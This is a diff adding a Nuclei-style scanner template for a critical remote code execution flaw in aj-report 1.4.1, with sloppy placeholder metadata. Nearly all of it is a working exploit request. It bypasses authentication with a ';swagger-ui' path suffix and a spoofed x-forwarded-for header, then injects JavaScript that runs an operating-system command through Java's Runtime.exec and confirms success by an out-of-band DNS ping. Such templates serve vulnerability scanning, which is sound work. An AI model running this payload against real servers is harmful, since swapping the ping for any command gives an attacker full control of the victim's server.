@@ -1,0 +1,33 @@
+id: AJ-Report-testTransform-rce
+
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: aj-report 1.4.1 代码审计多处高危漏洞导致服务器权限丢失.
+  reference:
+    - https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w
+    - https://github.com/anji-plus/report/issues/34
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /dataSet/testTransform;swagger-ui HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Content-Type: application/json; charset=UTF-8
+        Referer: http://106.15.79.23:9095/index.html
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        x-forwarded-for: 127.0.0.1
+        Connection: keep-alive
+        Content-Length: 696
+
+        { "dynSentence":"{\"apiUrl\":\"http://127.0.0.1:9095/dataSet/testTransform\",\"method\":\"GET\",\"header\":\"{\\\"Content-Type\\\":\\\"application/json;charset=UTF-8\\\"}\",\"body\":\"1\"}","dataSetParamDtoList": [   {     "paramName": "",     "paramDesc": "",    "paramType": "",    "sampleItem": "",    "mandatory": true,    "requiredFlag": 2,   "validationRules":"function dataTransform(){\nvar x=java.lang.Runtime.getRuntime().exec(\"ping {{interactsh-url}}\")\n}"  }],"dataSetTransformDtoList": [  {    "transformType": "js",    "transformScript": "function dataTransform(){\nvar x=java.lang.Runtime.getRuntime().exec(\"ping {{interactsh-url}}\")\n}"  }],"setType": "http"}
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
